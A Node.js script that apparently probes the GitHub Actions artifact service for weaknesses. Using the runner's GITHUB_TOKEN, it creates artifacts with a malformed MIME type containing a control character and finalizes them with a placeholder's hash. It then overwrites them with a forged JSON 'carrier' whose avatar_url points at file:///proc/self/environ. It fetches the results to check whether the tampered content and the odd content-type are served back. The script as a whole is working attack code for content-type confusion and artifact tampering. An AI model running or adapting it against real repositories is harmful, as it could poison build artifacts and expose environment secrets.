import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const sha=b=>createHash('sha256').update(b).digest('hex');
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const m=t.protocol==='https:'?https:http;const r=m.request(t,{method,headers,timeout:20000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function upload(url,bytes,ct){await new BlobClient(url).getBlockBlobClient().uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}

const cases=[
 ['noext', `ext-${runId}-a`, odd],
 ['dotjson', `ext-${runId}-b.json`, odd],
 ['dotzip', `ext-${runId}-c.zip`, odd],
 ['dottxt', `ext-${runId}-d.txt`, odd],
 ['dotjson-jsonmime', `ext-${runId}-e.json`, 'application/json'],
 ['noext-jsonmime', `ext-${runId}-f`, 'application/json'],
];
for(const [label,name,mime] of cases){
  const rec={label,nameHex:Buffer.from(name).toString('hex'),mimeHex:Buffer.from(mime,'latin1').toString('hex')};
  try{
    const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:mime})});
    rec.createOk=!!created.ok;
    if(!created.ok){console.log('EXTPROBE',JSON.stringify(rec));continue;}
    const placeholder=Buffer.from('{}');
    await upload(created.signedUploadUrl,placeholder,odd);
    const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:'sha256:'+sha(placeholder)})});
    rec.finalOk=!!fin.ok;rec.id=String(fin.artifactId||'');
    const carrier=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${rec.id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:label,stargazers_count:0}));
    await upload(created.signedUploadUrl,carrier,odd);
    rec.carrierSha=sha(carrier);
    const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-extprobe'});
    rec.restStatus=api.status;
    if(api.headers.location){const u=new URL(api.headers.location);rec.rsct=u.searchParams.get('rsct');rec.rsctHex=Buffer.from(rec.rsct||'','latin1').toString('hex');rec.query=u.search;
      const f=await req(api.headers.location);const cts=[];for(let i=0;i<f.rawHeaders.length;i+=2)if(f.rawHeaders[i].toLowerCase()==='content-type')cts.push(Buffer.from(f.rawHeaders[i+1],'latin1').toString('hex'));
      rec.finalStatus=f.status;rec.finalCts=cts;rec.bodyMatch=f.body.equals(carrier);}
  }catch(e){rec.error=String(e.message||e).slice(0,180);}
  console.log('EXTPROBE',JSON.stringify(rec));
}
